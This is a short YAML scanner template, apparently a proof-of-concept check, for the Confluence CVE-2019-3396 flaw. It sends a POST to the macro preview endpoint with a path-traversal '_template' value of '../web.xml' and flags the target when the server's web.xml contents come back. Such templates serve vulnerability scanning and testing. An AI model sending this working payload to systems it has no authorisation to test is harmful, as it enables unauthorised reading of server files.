name: poc-yaml-confluence-cve-2019-3396-lfi
rules:
  - method: POST
    path: /rest/tinymce/1/macro/preview
    headers:
      Content-Type: "application/json"
      Host: localhost
      Referer: http://localhost
    body: >-
      {"contentId":"786458","macro":{"name":"widget","body":"","params":{"url":"https://www.viddler.com/v/test","width":"1000","height":"1000","_template":"../web.xml"}}}
    follow_redirects: true
    expression: |
      response.status == 200 && response.body.bcontains(b"<param-name>contextConfigLocation</param-name>")
detail:
  author: sharecast
  links:
    - https://github.com/vulhub/vulhub/tree/master/confluence/CVE-2019-3396